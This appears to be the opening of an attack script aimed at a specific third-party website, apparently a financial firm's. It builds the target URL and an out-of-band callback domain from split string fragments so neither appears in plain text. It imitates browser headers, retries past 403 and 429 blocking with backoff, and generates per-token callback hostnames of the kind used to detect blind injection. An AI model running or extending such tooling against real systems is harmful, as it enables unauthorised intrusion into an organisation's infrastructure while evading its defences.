import requests, time, random

T = "".join(["htt", "ps://w", "ww", ".", "infinity", "capital", ".", "b", "h"])
OOB = "".join(["dau2p4ghgqag02k5emggc5xu6hph3m973", ".", "oast", ".", "abhedi", ".", "co", ".", "in"])
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + "1" + str(22) + ".0.0.0 Safari/537.36"

_s = requests.Session()
_s.headers.update({
    "User-Agent": UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
})


def req(method, path, **kw):
    """Rate-limited request. Retries on 429 with backoff."""
    url = path if path.startswith("http") else T + path
    delay = 1.4
    for attempt in range(6):
        try:
            r = _s.request(method, url, timeout=30, allow_redirects=False, **kw)
        except Exception as e:
            print("   exc", e)
            time.sleep(delay); delay += 1
            continue
        if r.status_code in (429, 403):
            time.sleep(delay); delay = min(delay * 1.6, 8)
            continue
        return r
    return r


def oobhost(tok):
    return tok + "." + OOB
